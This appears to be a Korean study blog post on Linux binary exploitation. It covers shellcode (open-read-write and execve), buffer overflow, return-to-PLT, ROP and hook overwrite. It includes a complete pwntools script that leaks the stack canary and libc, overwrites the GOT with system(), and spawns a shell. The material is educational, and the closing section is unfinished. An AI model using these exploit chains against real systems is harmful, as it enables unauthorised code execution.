---
title: "Exploit"
date: 2024-03-11T20:46:33+09:00
lastmod: 2024-03-11T20:46:33+09:00
tags: []
categories: []
imgs:  []
cover:  ""  # image show on top
readingTime:  true  # show reading time after article date
toc:  true
comments:  false
justify:  false  # text-align: justify;
single:  false  # display as a single page, hide navigation on bottom, like as about page.
license:  "BY-SA"  # CC License, https://creativecommons.org/licenses/?lang=ko
draft: false
---

# Exploit
- `pwntool`의 `checksec` 명령어로 어떤 보안이 적용되었는지 확인 가능하다.


## Shell Code
- exploit은 파일 읽고 쓰기(open-read-write, orw), 셸 명령 실행(execve) 권한을 취득하는 것을 목표로 한다.
- Shell 권한을 획득하기 위한 어셈블리 코드들의 모음을 'Shell Code' 라 칭한다.

## 취약점 공격 기법

### ORW
- 파일을 열고 읽고 쓸 수 있도록 하는 shell code를 'ORW shell code' 라 칭한다. 
- 시스템 콜들은 rax, rdi, rsi, rdx로 이루어 져 있음을 참고하여 shell code를 작성해 보자.
    - rax : 시스템 콜에 대응되는 번호
    - rdi : 시스템 콜의 첫 번째 인자
    - rsi : 시스템 콜의 두 번째 인자
    - rdx : 시스템 콜의 세 번째 인자
1. open
    - 리눅스에서 open 명령은 `open('FILE_PATH', flag, mode)` 형태이다. 
    - 이를 어셈블리어로 분리하여 표현하면 
        1) 'FILE_PATH' 을 stack에 담는다. 
            - 이때, stack에는 데이터가 8byte씩 올라가기 때문에 8byte 단위로 string을 끊어서 push한다.
            - ex) "1234567890" 을 stack에 담을 때 "09" "87654321" 순으로 데이터를 push해야 한다.
        2) rsp를 rdi로 옮겨  rdi(첫번째 인자)가 'FILE_PATH'를 가리키도록 한다.
        3) 두 번째와 세 번째 인자에 맞게 각각 rsi와 rdx를 설정한다.
        4) open은 시스템 콜 번호 2에 해당하므로 rax를 2로 설정한다.
    - ex) open ("1234567890", O_RDONLY, NULL) 은 아래 어셈블리어로 치환된다.
        ```
        push 0x3039
        mov rax, 0x3837363534333231 ; to push 8byte
        push rax
        mov rdi, rsp    ; (1) rdi = "1234567890"
        xor rsi, rsi    ; (3) rsi = 0 ; O_RDONLY
        xor rdx, rdx    ; (3) rdx = 0 ; NULL
        mov rax, 2      ; (4) rax = 2 ; syscall_open
        syscall         ; open("1234567890", O_RDONLY, NULL)
        ```

2. read
    - read 명령은 `read(FILE_DESCRIPTOR, buf, size)` 형태이다.
    - read 명령을 어셈블리어로 표현하면
      1) open을 통해 열린 파일의 file descriptor는 `rax` 영역에 저장되므로, `rax` 값을 `rdi` 에 대입한다.
      2) 데이터를 저장할 길이를 고려하여 `rsi`에 값을 대입한다. size가 10이라면 `rsp-10` 값을 대입한다.
      3) `rdx` 에 size 값을 대입한다.
      4) `rax` 에 read에 해당하는 0 값을 대입한다.
    - ex) read(fd, buf, 10) 은 아래 어셈블리어로 표현된다.
        ```
        mov rdi, rax      ; (1) fd값을 rdi에 대입
        mov rsi, rsp
        sub rsi, 0x0A     ; (2) rsi = rsp-10 ; buf
        mov rdx, 0x0A     ; (3) rdx = 0x0A     ; length
        mov rax, 0x0      ; (4) rax = 0        ; syscall_read
        syscall           ; read(fd, buf, 0x0A)
        ```
3. write
    - write 명령은 `write(FILE_DESCRIPTOR, buf, size)` 형태이다.
    - write 명령을 어셈블리어로 표현하면
        1) `rdi` 에 FILE_DESCRIPTOR 값을 대입한다. stdout으로 출력을 하려면 0x01을 적용한다.
        2) `rsi` 와 `rdx` 는 read 에서 사용한 값과 동일한 값을 적용한다.
        3) write 에 해당하는 시스템콜 번호 1을 `rax` 에 대입한다.
    - ex) write(fd, buf, 10) 은 아래 어셈블리어로 표현된다.
        ```
        mov rdi, 1        ; (1) rdi = 1 ; fd = stdout
                          ; rsi rdx 값은 read와 동일한 값 사용, 별도 설정 안함
        mov rax, 0x1      ; (3) rax = 1 ; syscall_write
        syscall           ; write(fd, buf, 0x0A)
        ```

- shell code는 어셈블리 형태이므로 기계어로 컴파일 해서 사용 가능하지만, 실행될 기기의 os, cpu에 따라 다른 방법을 사용해야 한다.
- shell code를 동작시키기 위해 skeleton code에 shell code를 삽입하여 컴파일 하는 방법을 사용할 수 있다. 
  - skeleton code란, 아무런 동작도 하지 않는 어셈블리어로 작성된 코드로, 컴파일이 가능하다. 
  - 마치 C언어에서 `void main(void) { return 0 }` 를 컴파일 하는 것과 같다. 
  - C언어로 작성된 skeleton code의 예시는 아래와 같다. 
  ```
    // 어셈블리어로 작성한 'assem_code' 함수를 실행시키는 파일
    __asm__(
        ".global assem_code\n"
        "assem_code:\n"

        # 여기에 원하는 assembly code를 집어넣는다.
        # 어셈블리 코드는 라인마다 마지막에 '\n' 가 붙어야 함에 주의한다.

        "xor rdi, rdi   # rdi = 0\n"
        "mov rax, 0x3c	# rax = sys_exit\n"
        "syscall        # exit(0)"
    );

    void assem_code();

    int main() { assem_code(); }
  ```
### execve
- execve() 는 Linux kernel 레벨의 함수로, 특정 프로그램을 실행시키는 함수이다. 
- `execve("/bin/bash", NULL, NULL)` 을 실행할 수 있게 되면 쉘을 실행할 수 있는 권한을 얻은 것이다. 
- execve는 `execve(FILE_NAME, argv, envp)` 형태로 실행되며, FILE_NAME은 실행할 프로그램 경로, argv는 인자, envp는 환경변수에 해당한다.
- execve를 어셈블리어로 표현하면
    1) 스택에 '/bin/bash' 를 넣고 `rdi`에 그 주소를 대입한다.
    2) `rsi`와 `rdx`는 NULL이므로 0을 대입한다. 
    3) execve는 시스템콜 번호 0x3B에 해당하므로 `rax`는 0x3B가 적용된다.
  ```
    push 0x68
    mov rax, 0x7361622f6e69622f
    push rax
    mov rdi, rsp  ; (1) rdi = "/bin/bash"
    xor rsi, rsi  ; (2) rsi = NULL
    xor rdx, rdx  ; (2) rdx = NULL
    mov rax, 0x3b ; (3) rax = execve
    syscall       ; execve("/bin/bash", null, null)
  ```

### buffer overflow
- 프로그램에 입력을 위해 지정된 버퍼를 초과하여 입력값을 집어넣어 버퍼 다음에 할당된 메모리의 값을 덮어쓰는 행위
- `scanf("%s",buf)`는 입력값의 갯수 제한이 없기 때문에 buffer overflow에 취약하므로 절대 사용하면 안되는 형태 중 하나이다.
  - scanf와 유사하게 strcpy, strcat, sprintf 도 길이에 제약이 없는 함수로, 대신 strncpy, strncat, snprintf, fgets, memcpy 를 사용하는것이 권장된다.
- C 계열 언어에서 문자열(string)을 처리할 때 문자열의 종결을 null('\0') 문자로 판단하는데, 문자열 끝에 null이 존재하지 않는 경우 문자열보다 더 뒷편의 주소를 참조하게 될 수 있고, 이를 OOB(out of boundary) 취약점이라 한다.

### ROP(Return Oriented Programming)
- gadget 이란 어셈블리어에서 ret 명령어 앞에 오는 코드 조각으로 코드의 실행을 제어한다.
- gadget 을 사용하여 함수의 호출 혹은 인자를 조작하는 공격 방식을 ROP라 한다.
- payload를 return gadget(리턴 가젯) 으로 채워지기에 `ROP chain` 이라고도 한다.

#### Return to Shellcode
- buffer overflow를 통해 버퍼에 shell 함수 실행 코드를 삽입하고 STL 에서 return 주소를 해당 버퍼의 주소로 치환하여 shell code를 실행하는 해킹 기법

#### Return To Library
- NX를 통해 특정 버퍼의 실행을 막자 library의 코드를 실행시켜서 쉘 권한을 얻는 방식의 해킹 기법
- 리눅스의 `libc` 라이브러리의 `system`, `execve` 함수를 실행시키는 것이 대표적이다.

#### Return to PLT
- ASLR 기법이 적용되어도 PLT의 주소는 고정되어 있음을 이용한 공격 방법 으로, PIE 기법을 적용하면 Return to PLT 공격을 예방할 수 있다.
- system 함수가 호출되고, canary가 유출되는 코드라면 아래 절차로 쉘을 실행시킬 수 있다.
  1. `system()` 이 호출 될 때 rdi 를 반환하는 위치를 찾는다. rdi 값을 "/bin/sh"로 설정하게 된다면 system("/bin/sh"), 즉 쉘을 실행하게 되는 것이다.
    - ROPgadget 을 사용하여 `pop rdi` 구문의 주소를 찾는다. (여러 개 있다면 이중 system() 함수의 위치를 특정해야 한다.)
    - `ROPgadget --binary BINARY_FILE_PATH --re pop rdi` 를 입력하면 BINARY_FILE_PATH 경로의 바이너리에서 'pop rdi' 구문이 들어있는 gadget들을 출력한다.
  2.  `/bin/sh` 문자열이 저장된 주소를 확인한다.
    - gdb로 바이너리를 실행시킨 후 `search /bin/sh` 명령으로 확인 가능하다.
  3. `system` 함수의 PLT 주소를 확인한다. 
    - gdb로 바이너리를 실행시킨 후 `plt` 명령으로 `system@plt` 값의 주소를 확인한다. (`info func system@plt` 명령도 가능)
  4. 리턴 가젯의 주소를 확인한다.
    - `ROPgadget --binary BINARY_FILE_PATH --re ret` 명령중 ret 가 단독으로 있는 라인(리턴 가젯)의 주소를 확인한다.
    - `system()` 함수는 내부에서 movaps 함수를 사용하는데, x64 환경에서 이 함수는 스택에서 값을 읽어올 때 16바이트로 정렬되는지 확인하고, 16바이트로 묶어지지 않는다면 exception을 발생시켜 segment fault을 유발한다.
    - 이를 '리턴 가젯'을 스택에 집어넣어 8바이트를 추가하여 16바이트를 맞춘다.
      - exploit을 활용해 A 주소번지를 스택프레임에 return code 영역에 넣으려 할 때, 아래와 같이 return code 자리에 직접 A 주소를 집어넣어도 되지만,
        ```
        canary
        ---------- rbp
        SFP
        ---------- rbp + 0x8
        return code   <-- A 주소 주입
        ---------- rbp + 0x10
        ```
      - 아래 그림과 같이 return code 자리에 리턴 가젯을 주입해도 된다.
        ```
        canary
        ---------- rbp
        SFP
        ---------- rbp + 0x8
        return code <-- 리턴 가젯 주입  
        ---------- rbp + 0x10
        ???????     <-- A 주소 주입
        ```
      - 리턴가젯 `ret` 는 `pop rip; jmp rip` 와 같은 효과이고, 이는 결국 rbp + 0x10 위치에 있는 A 주소를 실행하게 되어 첫번째 코드와 동작성은 같다. 
      - 다만, return code 자리보다 8byte 아래쪽 주소를 사용하게 된다.
    - [MOVAPS 관련 참조 페이지](https://ropemporium.com/guide.html)
  5. buffer overflow를 활용해 `canary`를 복구하고, SFP를 아무 값으로 채운다. 
  6. `return code` 리턴 가젯으로 채워 rbp+0x10의 주소에 있는 코드가 실행되도록 한다. (system 함수의 movaps 에 대응하기 위함)
  7. rbp + 0x10 주소를 `pop rdi` 가젯으로 채우고, (2)에서 찾은 `/bin/sh` 주소를 집어넣고, (3) 에서 찾은 `system` 함수의 plt 주소를 그 다음에 집어넣는다.
    - 여기까지 수행하면 스택은 다음과 같다. 
     ```
        canary
        ---------- rbp
        SFP   <-- 랜덤값 주입
        ---------- rbp + 0x8
        return code <-- 리턴 가젯 주입  
        ---------- rbp + 0x10
        ???????     <-- pop rdi 가젯 주입
        ---------- rbp + 0x18
        ???????     <-- "/bin/sh" string 주소 주입
        ---------- rbp + 0x20
        ???????     <-- system() 함수 plt 주소 주입
        ```

#### Return Oriented Programming
- 앞서 살펴본 `Return to ~` 공격은 일부 방어 기법이 빠져있을 때 사용할 수 있었다. 
- 카나리, NX, ASLR이 모두 적용되어 있어도, 프로그램에 buffer overflow 취약점을 통해 exploit 을 수행하는 방법을 알아본다.
- `NX` 보호기법 때문에 코드를 직접 버퍼에 작성하고 실행시킬수 없기에 "Return To Library" 에서처럼 라이브러리의 `system` 함수와 `"/bin/sh"` 문자열을 사용하여 `system("/bin/sh")` 를 동작시키는 것을 최종 목표로 한다.
1. stack canary 주소 확인
   - `printf`, `write`, `puts` 등 버퍼를 출력하는 함수의 버퍼를 overflow 시켜 rbp-0x08 에 위치한 canary를 확인한다.
     - [stack 참조](../../assembly/assembly_basic/#스택프레임)

2. system() 함수 주소 확인
   - `libc.so.6` 에 정의된 `system` 함수의 위치를 확인하기 위해 같은 라이브러리에 포함된 `read`, `puts`, `printf` 등의 함수가 호출되어 `GOT` 에 저장되었는지 확인한다. 
   - 라이브러리의 함수가 하나라도 호출되었다면, 라이브러리 파일 전체가 로드 되기 때문에 `syetem` 함수도 메모리에 적재 됨이 보장된다. 
   - [PLT/GOT 참조](../../computerscience/computer_science/#plt--got)
   - ASLR을 통해 라이브러리 파일의 적재 위치를 랜덤화 시켰지만, 라이브러리 파일 내부의 함수 위치는 랜덤화 시키지 못한다.
   - 즉, `libc` 라이브러리 버전이 같다면 실행된 프로그램의 메모리 상에 로딩된 `puts` 함수의 주소와 `system` 함수의 주소상 거리는 항상 일치한다는 것이다.
   - 이 점을 이용하여 (1) **libc 라이브러리의 시작 주소(libc_base)** 와 (2) **system 함수의 offset** 을 알 수 있다면 system 함수의 호출이 가능하다.

   1. libc 라이브러리의 시작 주소(libc_base) 확인
      - got에 로드 된 libc 함수의 주소와 해당 함수의 offset 을 빼면 libc_base 주소를 획득할 수 있다. 
      1. linux 명령어 + gdb 사용
         - 리눅스 쉘에서 `ldd /bin/bash` 명령을 사용하여 libc 의 경로를 확인한다.
           - ex) 
             ```
             linux-vdso.so.1 (0x00007ffff8cd0000)
             libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f0d65a90000)
             libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f0d65a80000)
             libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0d65880000)
             /lib64/ld-linux-x86-64.so.2 (0x00007f0d65c01000)
             ```
           - 혹은 `getconf -a | grep libc` 명령어로도 libc 버전을 확인할 수 있다. 
         - 확인된 libc 파일 경로를 `readelf` 명령어로 분석하여 내부 함수들의 주소를 확인한다. 
           - `readelf -s /lib/x86_64-linux-gnu/libc.so.6` 
             ```
             92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
             430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
             639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
             942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
             1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
             ```
            - ELF 상 system 함수의 offset이 0x0000000000052290 임을 알수 있다.
         - `gdb` 실행 후 `p system` 으로 got 에 저장된 system 함수의 주소를 확인할 수 있다.
           - ex) 
             ```
             # p system
             $1 = {int (const char *)} 0x7ffff7e1d290 <__libc_system>
             # p puts
             $2 = {int (const char *)} 0x7ffff7e4f420 <__GI__IO_puts>
             ```
         - got 상 주소에서 offset을 빼면 libc_base 주소를 구할 수 있다.
           - system 함수: 0x7ffff7e1d290 - 0x0000000000052290 = 0x7FFFF7DCB000
           - puts 함수: 0x7ffff7e4f420 - 0x0000000000084420 = 0x7FFFF7DCB000
           - libc_base의 주소가 0x7FFFF7DCB000 이며, 어떤 함수를 사용해도 계산 결과가 같은 것을 볼 수 있다. 

      2. pwntool 사용
         - libc 라이브러리의 ELF를 확인한다. 
            ```
            from pwn import *

            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            offset_read = libc.symbols['read']
            ```
         
         - 이제 read 함수의 주소를 확인해야 한다. 하지만 pwntool에서는 read 함수의 주소가 저장된 got 테이블의 주소는 확인할 수 있지만, 그 안에 저장된 값(read 함수의 메모리상 주소)은 확인할 수 없다.
         -  read 함수의 메모리상 주소값을 확인하려면 프로그램에서 got 값을 출력하도록 exploit code를 작성해야 한다. 
         -  buffer overflow를 통해 `write(1,read_got)` 를 호출하면 원하는 값을 출력할 수 있다. 
           - rdi(첫번째 인자)를 1, rsi(두번째 인자)를 read_got로 설정하기 위해 `return gadget` 을 사용한다.
           - `ROPgadget --binary PROGRAM_PATH` 로 검색 하여 `pop rsi` 와 `pop rdi` gadget 을 찾는다.
             - [ROPgadget 사용법 참조](../../systemhacking/pwntool/#ropgadget)

              ``` 
              0x0000000000400851 : pop rsi ; pop r15 ; ret
              0x0000000000400853 : pop rdi ; ret
              # 검색 결과 pop rdi / pop rsi 구문이 포함된 다른 gadget 이 없으므로 선택지는 없다.
              # gadget 의 주소는 동일한 프로그램 실행시 항상 일정한 값을 가지므로 미리 추출하여 사용할 수 있다.
              ```

         - exploit 코드를 작성한다. 
            ```
            from pwn import *

            p = process(PROGRAMA_PATH)
            e = ELF(PROGRAMA_PATH)

            # exploit code, 코드상 buffer overflow를 발생시킬 수 있는 구문이 있다고 가정한다.
            read_plt = e.plt['read']  # read 함수의 plt
            read_got = e.got['read']  # read 함수의 got
            write_plt = e.plt['write']  # write 함수의 plt
            pop_rdi_ret = 0x0000000000400853  # pop rdi; ret 구문의 주소
            pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret 구문의 주소
            
            payload = b'A'*(buffer_length + 8) + canary + b'B'*8  # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)
            payload += p64(pop_rdi_ret) + p64(1)  # rdi 에 1 을 적용하도록 gadget 배치
            payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.
            payload += p64(write_plt)  # return 주소를 write_plt 로 변경한다. 
            # write(1,read_got) 가 완성되었다. 결과로 read 함수의 주소를 출력한다.
            ```
         - 출력된 값에서 read 함수의 offset (앞서 구한 offset_read) 을 빼면 libc_base 를 구할 수 있다.

   2. system 함수의 offset 확인
      1. linux 명령어 사용     
         - `readelf -s /lib/x86_64-linux-gnu/libc.so.6` 
             ```
             92: 0000000000083970   448 FUNC    WEAK   DEFAULT   15 gets@@GLIBC_2.2.5
             430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
             639: 0000000000061c90   204 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.2.5
             942: 000000000010e1e0   153 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
             1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
             ```
         - system 함수의 offset은 `0x0000000000052290`
      2. pwntool 사용
         - ELF 함수로 ELF 파일을 읽고 필요한 함수의 symbol을 참조한다.
           ```
           libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
           offset_system = libc.symbols['system']
           print(offset_system)
           ```

   - 1,2에서 나온 결과를 종합하여, libc_base 에 system 함수의 offset을 더한 결과가 "실행된 프로그램의 메모리에 적재된 system 함수의 주소" 값이다. 
   - libc 의 일부 함수의 주소를 입력하면 libc 버전 및 다른 함수의 주소도 확인할 수 있는 사이트가 있다.
     - [사이트 링크](https://libc.rip/)

3. "/bin/sh" 문자열의 위치를 찾는다. (생략 가능)
   - "/bin/sh" 문자열을 lib.so.6 파일에서 찾을 수 있지만, writing 가능한 버퍼에 직접 문자열을 입력하는 방법도 있다. 후자의 경우 굳이 "/bin/sh" 를 찾을 필요가 없다.
   - libc.so.6 에 포함된 "/bin/sh" 문자열의 주소를 찾으려면, system() 함수의 주소를 찾을 때와 마찬가지로 `/bin/sh` 문자열의 offset 에 libc_base 주소를 더하여 참조할 수 있다.
   
   1. gdb 사용
      - `gdb` 를 사용하면 offset이 아닌 실제 주소를 확인할 수 있다. `search /bin/sh` 명령으로 /bin/sh 의 "메모리상 주소" 가 출력된다.
        - ex)
          ```
          pwndbg> search /bin/sh
          Searching for value: '/bin/sh'
          libc-2.31.so    0x7ffff7f7f5bd 0x68732f6e69622f /* '/bin/sh' */

          # /bin/sh 의 주소(0x7ffff7f7f5bd) 에서 libc_base 를 뺀 값이 /bin/sh 의 offset이 된다.
          ```

   2. linux 명령어 사용
      - linux의 `strings` 명령을 이용한다.
      - `strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh` 명령 결과 `1b45bd /bin/sh` 가 확인된다. 

   3. pwntool 사용
     - ELF 파일을 분석하여 나온 결과에 libc_base 를 더하면 실제 메모리 주소가 나온다. 
     - ex)
        ```
        from pwn import *
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        
        # /bin/sh offset 확인
        bin_sh1 = list(libc.search(b'/bin/sh'))[0]  # 방법1
        bin_sh2 = next(libc.search(b'/bin/sh'))  # 방법2
        # -> /bin/sh/ 의 메모리상 주소 == libc_base + bin_sh1 이다.
        ```
4. system("/bin/bash") 를 작성한다.
   - read 함수의 got 에 system 함수의 주소를 넣으면, 코드상 read("/bin/bash") 가 실제로는 system("/bin/bash") 로 동작하게 된다. 
   - 이를 이용해 got 영역을 조작하여 system 함수를 호출한다.
   1. pwntool 사용
      - 리눅스에서 `ROPgadget --binary rop` 명령으로 바이너리를 분석하면, return gadget 들이 확인된다. 이중 rdi, rsi 가 포함된 gadget들을 확인한다. (이하 rdi_ret, rsi_ret)
      - rdi_ret, rsi_ret 을 활용하여 rdi() 와 rsi 값을 알맞게 설정 해 주고, 원하는 함수를 호출한다..
      - gadget들은 특정 함수를 호출하는 것이 아니기 때문에 동일한 stack frame 안에서 호출되므로 canary 를 세팅 해 줄 필요는 없다. 
      - 코드상으로는 다음과 같다.
        ```
        # (2) 에서 libc_base 를 알아내기 위해 buffer overflow 로 read 함수의 got 영역을 출력하도록 payload를 작성했다.
        # 여기에 system("/bin/sh") 를 호출하기 위한 코드를 이어서 작성한다.
        # read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.
        # read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.
        # arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.
        payload += p64(pop_rdi_ret) + p64(0)  # rdi 에 0 값 적용
        payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용
        # read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.
        # e = ELF(PROGRAM_PATH)
        # read_plt = e.plt['read']
        payload += p64(read_plt)  # read 함수 호출

        # read의 got를 system으로 변경하게 되면, read("/bin/bash") 를 호출한 결과는 system("/bin/bash") 가 된다.  
        payload += p64(pop_rdi_ret) + p64(addr_bin_sh)
        payload += p64(read_plt)
        ```

- 정리하자면 아래와 같다.
  - 전제조건 : 
    - 1) buffer overflow 2회 이상
    - 2) 바이너리 보유
  - 순서:
    - 1) canary 획득
    - 2) exploit 용 payload 작성
      - 바이너리를 `ROPgadget --binary rop` 로 분석하여 return gadget 추출
      - `write(1, read_got, ?)` 함수를 return gadget 으로 작성하여 read 함수(다른 함수도 가능) 의 got 주소 출력 유도
      - `read(0, read_got, ?)` 함수를 return gadget 으로 작성하여 read 함수의 got 영역 값 덮어쓰도록 하기
        - `read(read_got + 8)` 함수를 호출. read 함수의 got 를 system 함수의 주소로 변경하고, `read_got + 8` 에 `"/bin/sh"` 를 넣을 예정이기 때문에, 이 구문은 `system("/bin/sh")` 가 될 예정
    - 3) payload를 프로그램에 전달하여 출력된 read 함수의 주소를 획득, 획득한 주소에서 read 함수의 offset 을 빼서 libc_base 계산
    - 4) libc_base 에 system 함수의 offset 을 더해서 system 함수의 주소 계산
    - 5) system 함수의 주소(8byte) + "/bin/sh"(8byte) 의 payload 를 작성하여 프로그램에 전달
      - 앞서 작성한 `read(0, read_got, ?)` 함수에서 이를 수신함
    - 그 결과 프로그램에서 `read(read_got + 8)` 는 `system("/bin/sh")` 로 변경되고, 쉘 권한을 획득하게 됨
- 전체 코드는 다음과 같다.

```
from pwn import *

##########
# RUN PROGRAM
##########
p = process(PROGRAM_PATH)
e = ELF(PROGRAM_PATH)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 특정 libc 파일을 적용하고 싶을 때
# p = process('PROGRAM_PATH', env= {"LD_PRELOAD" : "./libc.so.6"})
# libc = ELF('./libc.so.6')

buffer_length = 0x30  # exploit 할 코드에 따라 변경 필요

##########
# LEAK CANARY
##########
payload = b'A'*(buffer_length + 8 + 1) # overwrite buffer_length + 8(canary_dummy) + 1(canary_first 1 byte null)
# p.sendafter(b'Buf: ', payload)
p.send(payload)
p.recvuntil(payload)
canary = b'\x00' + p.recvn(7)
print('canary:',hex(u64(canary)))

##########
# LEAK ADDRESS OF LIBC FUNC
##########
read_got = e.got['read']  # read 함수의 got
read_plt = e.plt['read']  # read 함수의 plt
write_plt = e.plt['write']  # write 함수의 plt
pop_rdi_ret = 0x0000000000400853  # pop rdi; ret 구문의 주소
pop_rsi_pop_r15_ret = 0x0000000000400851  # pop rsi; pop r15; ret 구문의 주소
ret = 0x0000000000400596  # ret 구문의 주소, 리턴 가젯

payload = b'A'*(buffer_length + 8) + canary + b'B'*8  # overwrite buffer_length + 8(canary_dummy) + canary(8) + SFP(8)
payload += p64(pop_rdi_ret) + p64(1)  # rdi 에 1 을 적용하도록 gadget 배치
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 을 넣고, r15에 0(아무값) 을 넣는다.
payload += p64(write_plt)  # return 주소를 write_plt 로 변경한다.
# write(1,read_got) 가 완성되었다. payload를 프로그램에 넘기면 read 함수의 주소를 출력하게 된다.

##########
# CHANGE GOT OF READ INTO ADDR OF SYSTEM
##########
# 앞서 libc_base를 알아내기 위해 buffer overflow로 read 함수의 got 영역을 출력하도록 payload를 작성했다.
# payload에 system("/bin/sh") 를 호출하기 위한 코드를 이어서 작성한다.
# read_got 에 system 함수의 주소를 덮어쓰기 위해 read 함수를 한 번 더 호출한다.
# read(0, read_got, arg3) 를 호출하여 입력을 한 번 더 받도록 한다.
# arg3, 즉 rdx 에 6 이상의 값이 들어가야 하지만, ROPgadget 명령으로 확인 결과 rdx 가 포함된 gadget이 없다면 운에 맡기고 호출한다.
payload += p64(pop_rdi_ret) + p64(0)  # rdi 에 0 값 적용
payload += p64(pop_rsi_pop_r15_ret) + p64(read_got) + p64(0)  # rsi 에 read_got 주소 적용, r15 pop을 위한 더미값 0 적용
# read 함수의 plt 를 호출하면 system 함수가 호출되도록 got를 변경한다.
payload += p64(read_plt)  # read 함수 호출

# 참조
offset_bin_sh = next(libc.search(b'/bin/sh'))  # libc에 위치한 "/bin/sh" 문자열의 위치를 추출할 수 있다.
print('offset /bin/sh:', hex(offset_bin_sh))

##########
# CALL read("/bin/bash")
##########
# read의 got를 system으로 변경하게 되면, read("/bin/bash") 를 호출한 결과는 system("/bin/bash") 가 된다.
payload += p64(pop_rdi_ret) + p64(read_got + 0x08)  # "/bin/bash" 문자열을 libc에서 사용하지 않고 got 영역에 덮어써서 사용하겠다.
payload += p64(ret)  # system() 함수 내부의 movaps 가 스택의 데이터를 16바이트로 정렬하므로, 16바이트 짝을 맞추기 위해 리턴가젯 사용
payload += p64(read_plt)


# payload 보내게 되면 (1) read 함수 주소 출력, (2) stdin 입력 대기, 입력된 값으로 read_got 덮어씀, (3) system('/bin/sh') 실행
p.sendafter(b'Buf: ', payload)
addr_read = p.recvn(6).ljust(8,b'\x00')  # ASLR이 적용되면 라이브러리 함수의 주소는 항상 0x00007f 로 시작하므로 0x00 0x00 + 6자리로 구성된다.
print('addr read:', hex(u64(addr_read)))

##########
# CALC LIBC_BASE ADDR
##########
# 유출된 read 함수의 주소로 libc_base 가 메모리상에 위치하는 주소를 계산한다.
offset_read = libc.symbols['read']
libc_base = u64(addr_read) - offset_read
print('libc_base:', hex(libc_base))

##########
# CALC ADDR OF SYSTEM
##########
offset_system = libc.symbols['system']
addr_system = libc_base + offset_system
print('addr system:', hex(addr_system))

p.send(p64(addr_system) + b"/bin/sh\x00")

p.interactive()
```


### Hook Overwrite
- Hooking 이란 운영 체제가 특정 코드를 실행하려 할 때 다른 코드가 강제로 실행되도록 하는 기능이며, 이때 실행되는 코드를 `Hook` 이라 한다.
-  시스템 상 정의되어 있는 Hook 을 원하는 형태로 덮어써서 수행하는 공격을 `Hook Overwrite` 라 한다.
- libc.so 파일의 malloc 관련 함수들에 디버깅 편의를 위해 hook 이 미리 설정되어 있다. 
  - `__libc_malloc` 함수를 살펴보면 `__malloc_hook` 함수가 있으면 이를 호출하도록 되어 있다. 
  - free 함수와 realloc 함수들도 각각 `__free_hook`, `__realloc_hook` 함수가 hooking 되어있다.
  - `__malloc_hook` 는 `libc.so` 영역 안에 있으므로 writing 권한이 있는 라이브러리 영역이며, `__malloc_hook` 에 `Hook Overwrite` 공격을 수행하면 Full RELRO 기법으로 방어할 수 없다.
  - `readelf -s` 명령으로 libc.so 파일의 section 정보를 추출하고, `__malloc_hook` 함수의 index를 찾는다. 이후 `readelf -S` 혹은 `objdump -h` 명령으로  libc.so 파일의 section 들을 확인하여 해당 메모리 영역에 읽기/쓰기 권한이 있는지 확인 할 수 있다. 
    - `__malloc_hook`, `__free_hook`, `__realloc_hook` 가 저장되는 영역이 bss 영역인 linux 버전에서는 Hook Overwrite가 가능하다.
    - `__free_hook` 이나 `__malloc_hook` 은 보안 및 성능 때문에 glibc 2.34 버전부터 제거되었다.

#### Free Hook Overload
- `free` 함수에 적용된 `__free_hook` 를 덮어써서 exploit을 수행 해 본다.

1. libc_base 주소 확인
   - main 함수는 보통 `__libc_start_main` 함수에서 호출되고, `__libc_start_main` 함수의 메모리 주소는 `libc_base` 이다. 
   - main 함수의 스택 프레임을 확인하여 return address 를 추출한다. return address 는 __libc_start_main 함수의 어딘가를 가리킬 것이다. 
     - `gdb` 로 exploit 대상 프로그램을 로딩하고, `main` 함수에 break point 를 걸고, run 명령으로 프로그램을 실행시킨다. pwndbg 플러그인이 설치된 gdb라면 `bt` 명령으로 stack 상 `main` 함수의 return address 가 확인된다.
     - 이 return address 를 `x <주소>` 명령으로 확인하면 `__libc_start_main` + A(임의의 값) 으로 표시된 것을 확인 할 수 있다.
   - `readelf -s` 명령으로 libc 라이브러리에서 `__libc_start_main` 함수의 offset 을 확인한다.
   - 위에서 얻어낸 결과들로 아래 계산식을 통해 `libc_base` 의 주소를 얻어낸다. 
     - (`main` 함수의 return address) - (`__libc_start_main` 함수의 offset) - (A) = `libc_base`

2. `system` 함수와 `__free_hook` 함수를 치환한다.
   - ㄹ
